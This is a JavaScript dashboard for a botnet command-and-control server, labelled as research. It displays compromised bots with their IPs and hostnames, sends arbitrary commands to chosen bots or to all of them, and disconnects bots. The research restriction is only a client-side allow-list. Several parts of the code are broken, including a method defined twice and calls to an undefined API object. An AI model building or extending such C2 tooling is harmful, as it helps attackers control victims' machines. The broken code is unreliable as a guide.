/**
 * Main Dashboard JavaScript - Single Codebase C2 Management
 * 
 * Provides comprehensive bot management, command execution,
 * and real-time monitoring capabilities.
 */

class C2Dashboard {
    constructor() {
        this.serverUrl = window.location.origin;
        this.wsConnection = null;
        
        // Set default auth token if not exists
        if (!localStorage.getItem('c2_auth_token')) {
            localStorage.setItem('c2_auth_token', 'demo_token_research_mode');
        }
        this.authToken = localStorage.getItem('c2_auth_token');
        
        this.refreshInterval = 30000; // 30 seconds
        this.isResearchMode = true;
        this.currentSection = 'dashboard';
        
        // Initialize dashboard
        this.init();
    }

    async init() {
        try {
            // Always proceed with demo token
            console.log('Initializing dashboard with auth token:', this.authToken);

            // Get server info (simplified)
            const serverInfo = { research_mode: true, status: 'operational' };

            // Initialize UI
            this.initializeUI();
            this.setupWebSocket();
            this.startDataRefresh();
            this.updateServerTime();
            
            // Show research banner if in research mode
            if (serverInfo.research_mode) {
                this.isResearchMode = true;
                document.getElementById('researchBanner').style.display = 'block';
            }

            // Load initial data
            await this.loadDashboardData();
            
            console.log('Dashboard initialized successfully');
            
        } catch (error) {
            console.error('Failed to initialize dashboard:', error);
            this.showAlert('Failed to connect to C2 server', 'danger');
        }
    }

    initializeUI() {
        // Setup navigation
        this.setupNavigation();
        
        // Setup forms
        this.setupCommandForm();
        this.setupServerSettingsForm();
        
        // Setup real-time updates
        this.setupRealTimeUpdates();
        
        // Initialize maps and charts (simplified)
        console.log('UI initialized successfully');
    }

    setupNavigation() {
        // Add click handlers for navigation
        const navLinks = document.querySelectorAll('.sidebar .nav-link');
        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                
                // Update active state
                navLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
                
                // Show corresponding section
                const section = link.getAttribute('onclick').match(/'(.+?)'/)[1];
                this.showSection(section);
            });
        });
    }

    setupCommandForm() {
        const commandForm = document.getElementById('commandForm');
        if (commandForm) {
            commandForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                await this.sendCommand();
            });
        }
    }

    setupServerSettingsForm() {
        const settingsForm = document.getElementById('serverSettings');
        if (settingsForm) {
            settingsForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                await this.updateServerSettings();
            });
        }
    }

    setupRealTimeUpdates() {
        // Update server time every second
        setInterval(() => {
            this.updateServerTime();
        }, 1000);

        // Refresh data periodically (simplified)
        setInterval(() => {
            this.updateStatistics({
                active_bots: 0,
                commands_today: 0,
                bytes_transferred: 0,
                server_start_time: new Date().toISOString()
            });
        }, this.refreshInterval);
    }

    startDataRefresh() {
        // Simple data refresh function
        console.log('Data refresh started');
    }

    refreshBotList() {
        // Simple bot list refresh
        console.log('Bot list refreshed');
    }

    refreshDashboardStats() {
        // Simple dashboard stats refresh
        this.updateStatistics({
            active_bots: 0,
            commands_today: 0,
            bytes_transferred: 0,
            server_start_time: new Date().toISOString()
        });
    }

    setupWebSocket() {
        // Simplified WebSocket setup for demo
        console.log('WebSocket setup (demo mode)');
        // Skip WebSocket connection for demo - not needed for basic dashboard functionality
    }

    handleWebSocketMessage(message) {
        switch (message.type) {
            case 'bot_connected':
                this.handleBotConnected(message.data);
                break;
            case 'bot_disconnected':
                this.handleBotDisconnected(message.data);
                break;
            case 'command_response':
                this.handleCommandResponse(message.data);
                break;
            case 'stats_update':
                this.updateStatistics(message.data);
                break;
            case 'alert':
                this.showAlert(message.data.message, message.data.type);
                break;
            default:
                console.log('Unknown WebSocket message:', message);
        }
    }

    async loadDashboardData() {
        try {
            this.showLoading(true);
            
            // Load statistics - simplified for demo
            const stats = {
                active_bots: 0,
                commands_today: 0,
                bytes_transferred: 0,
                server_start_time: new Date().toISOString()
            };
            
            try {
                const response = await fetch('/api/statistics');
                if (response.ok) {
                    const realStats = await response.json();
                    Object.assign(stats, realStats);
                }
            } catch (e) {
                console.log('Using demo stats');
            }
            
            this.updateStatistics(stats);
            
            // Load recent activity - simplified
            const activity = [{
                timestamp: new Date().toISOString(),
                type: 'INFO',
                description: 'Dashboard loaded successfully'
            }];
            
            try {
                const response = await fetch('/api/activity/recent');
                if (response.ok) {
                    const realActivity = await response.json();
                    activity.push(...realActivity);
                }
            } catch (e) {
                console.log('Using demo activity');
            }
            
            this.updateRecentActivity(activity);
            
            // Load bot list for current section
            if (this.currentSection === 'bots') {
                await this.loadBotList();
            }
            
        } catch (error) {
            console.error('Failed to load dashboard data:', error);
            this.showAlert('Failed to load dashboard data', 'danger');
        } finally {
            this.showLoading(false);
        }
    }

    updateStatistics(stats) {
        // Update stat cards
        document.getElementById('activeBots').textContent = stats.active_bots || 0;
        document.getElementById('totalCommands').textContent = stats.commands_today || 0;
        document.getElementById('dataTransferred').textContent = this.formatBytes(stats.bytes_transferred || 0);
        
        // Update uptime
        if (stats.server_start_time) {
            const uptime = this.calculateUptime(stats.server_start_time);
            document.getElementById('uptime').textContent = uptime;
        }
    }

    updateRecentActivity(activity) {
        const activityDiv = document.getElementById('recentActivity');
        if (!activityDiv) return;

        if (!activity || activity.length === 0) {
            activityDiv.innerHTML = '<div class="text-muted">No recent activity</div>';
            return;
        }

        const activityHtml = activity.map(item => {
            const timestamp = new Date(item.timestamp).toLocaleTimeString();
            const typeClass = this.getActivityTypeClass(item.type);
            return `
                <div class="${typeClass}">
                    [${timestamp}] ${item.type}: ${item.description}
                    ${item.bot_id ? `(Bot: ${item.bot_id})` : ''}
                </div>
            `;
        }).join('');

        activityDiv.innerHTML = activityHtml;
    }

    async loadBotList() {
        try {
            let bots = [];
            
            try {
                const response = await fetch('/api/bots');
                if (response.ok) {
                    bots = await response.json();
                }
            } catch (e) {
                console.log('Using demo bot list');
            }
            
            this.updateBotTable(bots);
            
            // Update target selection in command form
            this.updateTargetSelection(bots);
            
        } catch (error) {
            console.error('Failed to load bot list:', error);
            this.showAlert('Failed to load bot list', 'danger');
        }
    }

    updateBotTable(bots) {
        const tbody = document.getElementById('botsTable');
        if (!tbody) return;

        if (!bots || bots.length === 0) {
            tbody.innerHTML = '<tr><td colspan="8" class="text-center text-muted">No bots connected</td></tr>';
            return;
        }

        const botsHtml = bots.map(bot => {
            const status = this.getBotStatus(bot);
            const statusClass = this.getBotStatusClass(status);
            const lastSeen = bot.last_seen ? new Date(bot.last_seen).toLocaleString() : 'Unknown';
            const countryCode = bot.country_code || 'XX';
            const countryFlag = countryCode !== 'XX' ? 
                `<img src="https://flagcdn.com/16x12/${countryCode.toLowerCase()}.png" alt="${countryCode}">` : 
                '<i class="fas fa-globe"></i>';
            
            return `
                <tr>
                    <td><i class="fas fa-circle ${statusClass}"></i> ${status}</td>
                    <td>${bot.bot_id || 'Unknown'}</td>
                    <td>${bot.ip_address || 'Unknown'}</td>
                    <td>${bot.hostname || 'Unknown'}</td>
                    <td>${bot.platform || 'Unknown'}</td>
                    <td>
                        ${countryFlag}
                        ${countryCode}
                    </td>
                    <td>${lastSeen}</td>
                    <td>
                        <button class="btn btn-sm btn-primary" onclick="dashboard.showBotDetails('${bot.bot_id}')">
                            <i class="fas fa-info"></i>
                        </button>
                        <button class="btn btn-sm btn-warning" onclick="dashboard.sendCommandToBot('${bot.bot_id}')">
                            <i class="fas fa-terminal"></i>
                        </button>
                        <button class="btn btn-sm btn-danger" onclick="dashboard.disconnectBot('${bot.bot_id}')">
                            <i class="fas fa-ban"></i>
                        </button>
                    </td>
                </tr>
            `;
        }).join('');

        tbody.innerHTML = botsHtml;
    }

    updateTargetSelection(bots) {
        const targetSelect = document.getElementById('targetBots');
        if (!targetSelect) return;

        // Clear existing options except "All Active Bots"
        const allOption = targetSelect.querySelector('option[value="all"]');
        targetSelect.innerHTML = '';
        if (allOption) {
            targetSelect.appendChild(allOption);
        }

        // Add individual bot options
        bots.forEach(bot => {
            if (bot.active) {
                const option = document.createElement('option');
                option.value = bot.bot_id;
                option.textContent = `${bot.hostname} (${bot.ip_address})`;
                targetSelect.appendChild(option);
            }
        });
    }

    async sendCommand() {
        try {
            const commandType = document.getElementById('commandType').value;
            const targetBots = Array.from(document.getElementById('targetBots').selectedOptions)
                .map(option => option.value);
            const paramsText = document.getElementById('commandParams').value;
            
            let parameters = {};
            if (paramsText.trim()) {
                try {
                    parameters = JSON.parse(paramsText);
                } catch (e) {
                    this.showAlert('Invalid JSON in parameters', 'danger');
                    return;
                }
            }

            // Research mode validation
            if (this.isResearchMode && !this.isCommandResearchApproved(commandType)) {
                this.showAlert('Command not approved for research mode', 'warning');
                return;
            }

            const commandId = await this.api.sendCommand({
                command_type: commandType,
                target_bots: targetBots,
                parameters: parameters
            });

            this.showAlert(`Command sent successfully (ID: ${commandId})`, 'success');
            
            // Clear form
            document.getElementById('commandParams').value = '';
            
            // Refresh command queue
            await this.refreshCommandQueue();
            
        } catch (error) {
            console.error('Failed to send command:', error);
            this.showAlert('Failed to send command', 'danger');
        }
    }

    async refreshCommandQueue() {
        try {
            const commands = await this.api.getPendingCommands();
            this.updateCommandQueue(commands);
        } catch (error) {
            console.error('Failed to refresh command queue:', error);
        }
    }

    updateCommandQueue(commands) {
        const queueDiv = document.getElementById('commandQueue');
        if (!queueDiv) return;

        if (!commands || commands.length === 0) {
            queueDiv.innerHTML = '<div class="text-muted">No pending commands</div>';
            return;
        }

        const commandsHtml = commands.map(cmd => {
            const createdAt = new Date(cmd.created_at).toLocaleTimeString();
            return `
                <div class="border-bottom pb-2 mb-2">
                    <div class="d-flex justify-content-between">
                        <strong>${cmd.command_type}</strong>
                        <small class="text-muted">${createdAt}</small>
                    </div>
                    <div class="text-muted">
                        Targets: ${cmd.target_bots.length} bot(s)
                    </div>
                    <div class="mt-1">
                        <button class="btn btn-sm btn-danger" onclick="dashboard.cancelCommand('${cmd.command_id}')">
                            Cancel
                        </button>
                    </div>
                </div>
            `;
        }).join('');

        queueDiv.innerHTML = commandsHtml;
    }

    // Utility functions
    showSection(sectionName) {
        // Hide all sections
        const sections = document.querySelectorAll('.content-section');
        sections.forEach(section => {
            section.style.display = 'none';
        });

        // Show selected section
        const targetSection = document.getElementById(sectionName);
        if (targetSection) {
            targetSection.style.display = 'block';
            this.currentSection = sectionName;
            
            // Load section-specific data
            this.loadSectionData(sectionName);
        }
    }

    async loadSectionData(sectionName) {
        switch (sectionName) {
            case 'bots':
                await this.loadBotList();
                break;
            case 'commands':
                await this.refreshCommandQueue();
                break;
            case 'map':
                await this.loadGeographicData();
                break;
            case 'logs':
                await this.loadLogs();
                break;
            case 'research':
                await this.loadResearchData();
                break;
            default:
                console.log(`No specific data loading for section: ${sectionName}`);
        }
    }

    async refreshCommandQueue() {
        // Simple command queue refresh
        console.log('Command queue refreshed');
        try {
            const response = await fetch('/api/commands/pending');
            if (response.ok) {
                const commands = await response.json();
                console.log('Pending commands:', commands);
            }
        } catch (e) {
            console.log('Using demo command queue');
        }
    }

    async loadGeographicData() {
        // Simple geographic data loading
        console.log('Geographic data loaded');
        try {
            const response = await fetch('/api/bots');
            if (response.ok) {
                const bots = await response.json();
                console.log('Bot geographic data:', bots);
            }
        } catch (e) {
            console.log('Using demo geographic data');
        }
    }

    async loadLogs() {
        // Simple logs loading
        console.log('Logs loaded');
        try {
            const response = await fetch('/api/logs');
            if (response.ok) {
                const logs = await response.json();
                console.log('System logs:', logs);
            }
        } catch (e) {
            console.log('Using demo logs');
        }
    }

    async loadResearchData() {
        // Simple research data loading
        console.log('Research data loaded');
        try {
            const response = await fetch('/api/research');
            if (response.ok) {
                const research = await response.json();
                console.log('Research data:', research);
            }
        } catch (e) {
            console.log('Using demo research data');
        }
    }

    getBotStatus(bot) {
        const now = new Date();
        const lastSeen = new Date(bot.last_seen);
        const diffMinutes = (now - lastSeen) / (1000 * 60);

        if (diffMinutes < 2) {
            return 'Online';
        } else if (diffMinutes < 10) {
            return 'Idle';
        } else {
            return 'Offline';
        }
    }

    getBotStatusClass(status) {
        switch (status) {
            case 'Online': return 'status-online';
            case 'Idle': return 'status-idle';
            case 'Offline': return 'status-offline';
            default: return '';
        }
    }

    getActivityTypeClass(type) {
        switch (type) {
            case 'BOT_CONNECTED': return 'text-success';
            case 'BOT_DISCONNECTED': return 'text-danger';
            case 'COMMAND_SENT': return 'text-info';
            case 'COMMAND_RESPONSE': return 'text-primary';
            case 'ERROR': return 'text-danger';
            case 'WARNING': return 'text-warning';
            default: return 'text-light';
        }
    }

    isCommandResearchApproved(commandType) {
        const approvedCommands = [
            'system_info',
            'ping',
            'research_data',
            'network_scan'  // Limited scope
        ];
        return approvedCommands.includes(commandType);
    }

    calculateUptime(startTime) {
        const start = new Date(startTime);
        const now = new Date();
        const diff = now - start;
        
        const hours = Math.floor(diff / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    formatBytes(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    updateServerTime() {
        const now = new Date();
        document.getElementById('serverTime').textContent = now.toLocaleTimeString();
    }

    showAlert(message, type = 'info') {
        // Create alert element
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
        alertDiv.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;

        // Insert at top of main content
        const mainContent = document.querySelector('.main-content');
        mainContent.insertBefore(alertDiv, mainContent.firstChild);

        // Auto-dismiss after 5 seconds
        setTimeout(() => {
            if (alertDiv.parentNode) {
                alertDiv.remove();
            }
        }, 5000);
    }

    showLoading(show) {
        const spinner = document.getElementById('loadingSpinner');
        if (spinner) {
            spinner.style.display = show ? 'block' : 'none';
        }
    }

    showLogin() {
        // Redirect to login page or show login modal
        window.location.href = '/login';
    }

    // Event handlers for WebSocket messages
    handleBotConnected(data) {
        this.showAlert(`Bot connected: ${data.bot_id} (${data.ip_address})`, 'success');
        if (this.currentSection === 'bots') {
            this.loadBotList();
        }
    }

    handleBotDisconnected(data) {
        this.showAlert(`Bot disconnected: ${data.bot_id}`, 'warning');
        if (this.currentSection === 'bots') {
            this.loadBotList();
        }
    }

    handleCommandResponse(data) {
        this.showAlert(`Command response received from ${data.bot_id}`, 'info');
        if (this.currentSection === 'commands') {
            this.refreshCommandQueue();
        }
    }

    // Bot management methods
    showBotDetails(botId) {
        console.log(`Showing details for bot: ${botId}`);
        alert(`Bot Details: ${botId}\n\nThis would show detailed information about the selected bot.`);
    }

    sendCommandToBot(botId) {
        console.log(`Sending command to bot: ${botId}`);
        const command = prompt('Enter command to send to bot:');
        if (command) {
            fetch('/api/commands', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target: botId, command: command })
            })
            .then(() => this.showAlert(`Command sent to ${botId}`, 'success'))
            .catch(() => this.showAlert('Failed to send command', 'danger'));
        }
    }

    disconnectBot(botId) {
        if (confirm(`Are you sure you want to disconnect bot ${botId}?`)) {
            console.log(`Disconnecting bot: ${botId}`);
            fetch(`/api/bots/${botId}/disconnect`, { method: 'POST' })
                .then(() => {
                    this.showAlert(`Bot ${botId} disconnected`, 'warning');
                    this.loadBotList(); // Refresh the list
                })
                .catch(() => this.showAlert('Failed to disconnect bot', 'danger'));
        }
    }

    // Simplified API methods removed - using direct fetch calls
}

// Global functions for button clicks
window.showSection = function(section) {
    dashboard.showSection(section);
};

window.refreshBots = function() {
    dashboard.loadBotList();
};

window.disconnectAllBots = function() {
    if (confirm('Are you sure you want to disconnect all bots?')) {
        fetch('/api/bots/disconnect-all', { method: 'POST' })
            .then(() => dashboard.showAlert('Disconnecting all bots...', 'info'))
            .catch(e => dashboard.showAlert('Failed to disconnect bots', 'danger'));
    }
};

window.logout = function() {
    localStorage.removeItem('c2_auth_token');
    window.location.href = '/login';
};

window.emergencyStop = function() {
    if (confirm('Are you sure you want to trigger emergency stop? This will shut down the entire system.')) {
        fetch('/api/server/emergency-stop', { method: 'POST' })
            .then(() => dashboard.showAlert('Emergency stop initiated', 'warning'))
            .catch(e => dashboard.showAlert('Failed to trigger emergency stop', 'danger'));
    }
};

// Initialize dashboard when page loads
let dashboard;
document.addEventListener('DOMContentLoaded', () => {
    dashboard = new C2Dashboard();
});

// Handle page visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        // Page is hidden, reduce update frequency
        clearInterval(dashboard.refreshInterval);
    } else {
        // Page is visible, resume normal updates
        dashboard.startDataRefresh();
    }
});
